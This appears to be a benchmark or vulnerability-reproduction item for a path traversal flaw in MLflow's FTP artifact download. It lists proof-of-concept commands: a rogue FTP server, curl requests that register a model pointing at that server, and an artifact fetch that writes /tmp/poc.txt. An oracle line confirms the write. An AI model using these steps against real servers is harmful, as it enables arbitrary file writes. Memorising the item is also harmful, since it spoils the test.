title: Path traversal in FTP artifact download due to improper filename normalization
trigger_payload:
python rogue_ftp.py --port 4444 --path /tmp/poc.txt --content "Hello :)"
mlflow ui --host 0.0.0.0:5000
curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc"}' 'http://127.0.0.1:5000/ajax/registered-models/create'
curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc", "source": "ftp://mizu:mizu@127.0.0.1:4444"}' 'http://127.0.0.1:5000/ajax/model-versions/create'
curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=random&name=poc&version=1'
oracle: File /tmp/poc.txt is created on the server with the content 'Hello :)'
